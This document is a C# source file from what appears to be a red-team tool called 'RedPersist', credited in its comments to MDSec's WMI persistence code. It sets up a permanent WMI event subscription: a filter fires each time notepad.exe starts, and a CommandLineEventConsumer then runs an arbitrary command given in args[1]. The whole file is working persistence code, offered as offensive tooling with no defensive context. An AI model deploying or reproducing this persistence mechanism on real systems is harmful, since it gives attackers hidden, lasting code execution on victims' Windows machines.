using System;
using System.Text;
using System.Management;

// stolen from domchell @mdsec
//thanks for letting me use his code
//https://github.com/mdsecactivebreach/WMIPersistence/blob/master/WMIPersist.cs

namespace RedPersist.Persist
{
    public class Wmi1
    {
        public static void PersistWMI(string[] args)
        {
            ManagementObject myEventFilter = null;
            ManagementObject myEventConsumer = null;
            ManagementObject myBinder = null;

            try
            {
                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
                ManagementClass wmiEventFilter = new ManagementClass(scope, new
                ManagementPath("__EventFilter"), null);
                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " + "WHERE TargetInstance ISA \"Win32_Process\" " + "AND TargetInstance.Name = \"notepad.exe\"";
                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
                myEventFilter = wmiEventFilter.CreateInstance();
                myEventFilter["Name"] = "demoEventFilter";
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";
                myEventFilter.Put();
                Console.WriteLine("[*] Event filter created.");
                myEventConsumer =
                new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"),
                null).CreateInstance();
                myEventConsumer["Name"] = "Hello From sadsad Team";
                myEventConsumer["CommandLineTemplate"] = args[1];
                myEventConsumer.Put();
                Console.WriteLine("[*] Event consumer created.");
                myBinder =
                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
                null).CreateInstance();
                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
                myBinder.Put();

                Console.WriteLine("[*] Subscription created");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
            Console.ReadKey();

            Console.WriteLine("[*] Check values with: Get-WMIObject -Namespace root\\Subscription -Class __EventConsumer via Powershell");

        }
    }
}
